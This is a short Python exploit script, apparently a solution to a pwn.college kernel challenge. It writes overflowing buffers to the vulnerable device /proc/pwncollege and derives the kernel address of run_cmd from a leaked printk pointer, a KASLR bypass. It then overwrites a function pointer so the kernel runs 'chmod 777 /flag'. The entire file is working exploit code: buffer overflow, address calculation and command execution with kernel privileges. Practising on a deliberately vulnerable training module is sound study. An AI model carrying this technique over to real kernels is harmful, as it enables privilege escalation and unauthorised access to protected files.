# 0xffffffff81089b30 t run_cmd

from pwn import *
import os
import fcntl

context.arch = "amd64"
byte_codes = b""
byte_codes += b"A"*(256-len(byte_codes))
#byte_codes +=0xffffffff81089b30.to_bytes(8, "little")
# b"\xa9ik\xae\xff\xff\xff\xff"
# ffffffff998b69a9 T printk
# ffffffff99889b30 t run_cmd
# ffffffffb6289b30 t run_cmd
# ffffffffb62b69a9 T printk
fd = os.open("/proc/pwncollege", 2)

os.write(fd, byte_codes)

os.close(fd)

c = b"\xa9i\xab\x8d\xff\xff\xff\xff"
a = int.from_bytes(c,"little")
a = a & 0xfffffffffff00000
a = a ^   0x0000000000089b30
byte_codes = b"/run/workspace/bin/chmod 777 /flag\x00"
byte_codes += b"A"*(256-len(byte_codes))
byte_codes +=a.to_bytes(8, "little")

fd = os.open("/proc/pwncollege", 2)

os.write(fd, byte_codes)

os.close(fd)